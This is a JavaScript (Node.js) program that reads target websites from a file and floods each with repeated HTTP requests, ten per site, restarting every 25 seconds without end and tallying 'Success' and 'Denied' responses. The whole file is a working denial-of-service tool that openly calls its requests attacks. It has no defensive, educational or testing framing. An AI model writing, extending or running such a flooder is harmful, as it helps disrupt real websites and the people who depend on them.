const SITES_FILE = 'urls.txt'; // file with sites list
const ATTACK_COUNT = 10; // number of attacks per site
const DELAY_BETWEEN_ATTACK = 25000; // ms 60000 = 1min
const SUCCESS_MESSAGE = false; // show success message

const request = require('request');
const fs = require('fs');
const readline = require('readline');

const TIME_START_ATTACK = new Date();

function timeAfterStart() {
  const currentTime = new Date() - TIME_START_ATTACK;
  const s = Math.floor((currentTime / 1000) % 60);
  const m = Math.floor((currentTime / (1000 * 60)) % 60);
  const h = Math.floor(currentTime / (1000 * 60 * 60));
  return `${h < 10 ? '0' + h : h}:${m < 10 ? '0' + m : m}:${
    s < 10 ? '0' + s : s
  }`;
}
class Site {
  #url;
  #attackTimes = 1;
  #successMessage;

  static denied = 0;
  static success = 0;

  constructor(url, attackTimes = 1, successMessage = false) {
    this.#url = url;
    this.#attackTimes = attackTimes;
    this.#successMessage = successMessage;
  }

  consoleMessage(attackStatus, statusCode) {
    console.log(
      `${attackStatus} attack ${this.#url} ${
        attackStatus === 'Success' ? '' : 'error '
      }code: ${statusCode}`
    );
  }

  attackUrl() {
    return new Promise((resolve, reject) => {
      request(this.#url, (err, res, body) => {
        const attackStatus = body?.length ? 'Success' : 'Denied';
        attackStatus === 'Success' ? Site.success++ : Site.denied++;

        if (err) reject(err);

        resolve({ attackStatus, res });
      });
    });
  }

  repeatAttack(times) {
    if (times <= 0) return;
    this.startAttack(false);
    this.repeatAttack(--times);
  }

  startAttack(testAttack = true) {
    this.attackUrl()
      .then(({ attackStatus, res }) => {
        this.#successMessage &&
          this.consoleMessage(attackStatus, res.statusCode);
        testAttack && this.repeatAttack(this.#attackTimes);
      })
      .catch(({ errno }) => {
        this.consoleMessage('Denied', errno);
      });
  }
}

async function updateUrls() {
  const sites = [];
  const fileStream = fs.createReadStream(SITES_FILE);
  const rl = readline.createInterface({
    input: fileStream,
    crlfDelay: Infinity,
  });

  for await (const url of rl) {
    if (!url.includes('!'))
      sites.push(new Site(url, ATTACK_COUNT, SUCCESS_MESSAGE));
  }
  return sites;
}

async function startAttackSites() {
  const sites = await updateUrls();

  sites.forEach((site) => {
    site.startAttack();
  });

  console.log(
    `Sites count: ${sites.length}, duration: ${timeAfterStart()}, Success: ${
      Site.success
    }, Denied: ${Site.denied}`
  );
  setTimeout(startAttackSites, DELAY_BETWEEN_ATTACK);
}

startAttackSites();
console.log('Attack had been started....');
